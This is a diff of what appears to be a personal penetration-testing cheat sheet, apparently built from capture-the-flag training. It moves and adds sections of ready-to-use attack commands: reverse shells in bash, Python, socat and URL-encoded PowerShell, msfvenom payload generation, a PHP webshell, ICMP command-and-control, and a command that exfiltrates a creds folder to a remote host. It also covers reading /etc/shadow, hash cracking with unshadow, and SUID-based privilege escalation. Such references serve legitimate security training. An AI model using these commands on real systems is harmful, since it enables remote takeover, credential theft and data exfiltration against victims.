@@ -76,18 +76,6 @@ socat OPENSSL:<LOCAL-IP>:<LOCAL-PORT>,verify=0 EXEC:/bin/bash # Connect back to 
 socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes # Open a listener on the target
 socat OPENSSL:<TARGET-IP>:<TARGET-PORT>,verify=0 - # Connect to that listener from your machine
 
-
-# ==============
-# Reverse Shells
-# ==============
-bash -i >& /dev/tcp/10.0.0.1/4242 0>&1
-0<&196;exec 196<>/dev/tcp/10.0.0.1/4242; sh <&196 >&196 2>&196
-/bin/bash -l > /dev/tcp/10.0.0.1/4242 0<&1 2>&1
-sh -i >& /dev/udp/10.0.0.1/4242 0>&1 # UDP Reverse Shell NOTE: Listen with: nc -u -lvp 4242
-
-
-
-
 # =====
 # Hydra
 # =====
@@ -107,14 +95,6 @@ tmux new-session -s session_name # Create a new session
 # =========
 syn.scan 192.168.1.0/24 1 10000 # Ports 1-10000
 
-# ==========
-# Metasploit
-# ==========
-msfvenom -p <PAYLOAD> <OPTIONS> # Standard syntax for msfvenom commands
-msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=<listen-IP> LPORT=<listen-port> # Generate a Windows x64 Reverse Shell in a .exe format
-<OS>/<arch>/<payload>, Examples: linux/x86/shell_reverse_tcp, windows/shell_reverse_tcp, shell/reverse_tcp # Staged Payloads are denoted by '/' while stageless are denoted by '_'
-use multi/handler # Multi/Handler is a superb tool for catching reverse shells
-exploit -j # Tells metasploit to exploit as a background job
 
 # ========
 # Gobuster
@@ -138,15 +118,6 @@ ffuf -w /path/to/wordlist -u https://target/FUZZ # Brute force web directories
 curl -I <URL> | grep Server # Server HTTP Header
 nc <IP> 22 # Grab SSH Header
 nmap -sV -p <port_number> <hostname or IP address>
-
-# ==============
-# Reverse Shells
-# ==============
-bash -c 'sh -i >& /dev/tcp/<Attackers-IP>/<Listening-Port> 0>&1' # RevShell with Bash (Newer Linux Distros)
-# Python RevShell
-python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<LHOST>",<LPORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
-export TERM=xterm # Gain terminal commands such as "clear" etc...
-stty raw -echo; fg # Turns off terminal echo and allows ctrl+c for killing processes
 
 # =======
 # davtest
@@ -203,11 +174,87 @@ sudo icmp-cnc -i eth1 -d 192.168.0.121 # Establish C2 to the victim host
 # ==========
 set INTERFACE eth0 # Setting interface in MSF
 use auxiliary/server/icmp_exfil # ICMP exfiltration
+msfvenom -p <PAYLOAD> <OPTIONS> # Standard syntax for msfvenom commands
+msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=<listen-IP> LPORT=<listen-port> # Generate a Windows x64 Reverse Shell in a .exe format
+<OS>/<arch>/<payload>, Examples: linux/x86/shell_reverse_tcp, windows/shell_reverse_tcp, shell/reverse_tcp # Staged Payloads are denoted by '/' while stageless are denoted by '_'
+use multi/handler # Multi/Handler is a superb tool for catching reverse shells
+exploit -j # Tells metasploit to exploit as a background job
 
-IyEvYmluL2Jhc2ggCnBpbmcgLWMgMSB0ZXN0LnRobS5jb20K
+# ==============
+# Reverse Shells
+# ==============
+bash -c 'sh -i >& /dev/tcp/<Attackers-IP>/<Listening-Port> 0>&1' # RevShell with Bash (Newer Linux Distros)
+# Python RevShell
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<LHOST>",<LPORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+export TERM=xterm # Gain terminal commands such as "clear" etc...
+stty raw -echo; fg # Turns off terminal echo and allows ctrl+c for killing processes
+bash -i >& /dev/tcp/10.0.0.1/4242 0>&1
+0<&196;exec 196<>/dev/tcp/10.0.0.1/4242; sh <&196 >&196 2>&196
+/bin/bash -l > /dev/tcp/10.0.0.1/4242 0<&1 2>&1
+sh -i >& /dev/udp/10.0.0.1/4242 0>&1 # UDP Reverse Shell NOTE: Listen with: nc -u -lvp 4242
+
+# ====================
+# Privilege Escalation
+# ====================
+
+hostname # Returns the hostname
+uname -a # Additional Kernel Info
+/proc/version # Extra kernel info
+lsb_release -a # Learn more about the distro
+/etc/issue
+ps -a # Display all processes
+ps axjf # Display process tree
+ps aux # Displays processes of all users 
+env # Shows environment variables
+sudo -l # List all commands your user can run with sudo
+ls -la # List all contents of a directory
+id # Provides a general overview of the user’s privilege level and group memberships.
+cat /etc/passwd | grep "home" # Find most real users on a system
+history # Provides history of commands
+ifconfig # Network Interface Info and More
+ip route # Show which routes exist
+netstat -a # shows all listening ports and established connections.
+netstat -at # List listening tcp ports and connections
+netstat -au # List listening udp ports and connections
+netstat -l # List all active listening connections. NOTE: use with -t or -u for checking tcp and udp connection
+netstat -s # list network usage statistics by protoco
+sudo netstat -tp # list connections with the service name and PID information.
+netstat -i # Shows interface statistics
+find . -name flag1.txt # find the file named “flag1.txt” in the current directory
+find /home -name flag1.txt # find the file names “flag1.txt” in the /home directory
+find / -type d -name config # find the directory named config under “/”
+find / -type f -perm 0777 # find files with the 777 permissions (files readable, writable, and executable by all users)
+find / -perm a=x # find executable files
+find /home -user frank # find all files for user “frank” under “/home”
+find / -mtime 10 # find files that were modified in the last 10 days
+find / -atime 10 # find files that were accessed in the last 10 day
+find / -cmin -60 # find files changed within the last hour (60 minutes)
+find / -amin -60 # find files accesses within the last hour (60 minutes)
+find / -size 50M # find files with a 50 MB size
+find / -writable -type d 2>/dev/null # Find world-writeable folders
+find / -perm -222 -type d 2>/dev/null # Find world-writeable folders
+find / -perm -o w -type d 2>/dev/null # Find world-writeable folders
+find / -perm -o x -type d 2>/dev/null # Find world-executable folders
+find / -name perl*
+find / -name python*
+find / -name gcc*
+find / -perm -u=s -type f 2>/dev/null # Find files with the SUID bit, which allows us to run the file with a higher privilege level than the current user.
+find / -type f -perm -04000 -ls 2>/dev/null # Will list files that have SUID or SGID bits set.
+find / -writable 2>/dev/null
+find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u
+/usr/bin/base64 /etc/shadow | /usr/bin/base64 -d # Combining base64 with shadow so we can read it
+getcap # List capabilities
+getcap -r / # Generates a ton of errors, so redirect to /dev/null
+showmount -e <target-ip>
+sudo mount -o rw 10.10.223.238:/home/ubuntu/sharedfolder /tmp/sharedfolder
+sudo unshadow passwd.txt shadow.txt > cracked.txt
+sudo find . -exec /bin/sh \; -quit.
 
 
+# ======
 # Random
+# ======
+
 # Tar creates an Archive. z is for using gzip to compress the selected folder, the c is for creating a new archive, and the f is for using an archive file. Then pipe/convert to base64
 # Then, we passed the result of the base64 command to create and copy a backup file with the dd command using EBCDIC encoding data.
 tar zcf - creds/ | base64 | dd conv=ebcdic > /dev/tcp/192.168.0.133/8080 # TCP Socket Exfiltration from Victim
@@ -229,7 +276,7 @@ powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<ip>',<port>);
 <?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?> # Example Simple PHP Webshell
 # Webshell with Powershell for RevShell! Lol
 powershell%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient%28%27<IP>%27%2C<PORT>%29%3B%24stream%20%3D%20%24client.GetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream.Read%28%24bytes%2C%200%2C%20%24bytes.Length%29%29%20-ne%200%29%7B%3B%24data%20%3D%20%28New-Object%20-TypeName%20System.Text.ASCIIEncoding%29.GetString%28%24bytes%2C0%2C%20%24i%29%3B%24sendback%20%3D%20%28iex%20%24data%202%3E%261%20%7C%20Out-String%20%29%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20%28pwd%29.Path%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20%28%5Btext.encoding%5D%3A%3AASCII%29.GetBytes%28%24sendback2%29%3B%24stream.Write%28%24sendbyte%2C0%2C%24sendbyte.Length%29%3B%24stream.Flush%28%29%7D%3B%24client.Close%28%29%22
-
+openssl passwd -1 -salt <password>
 
 
 
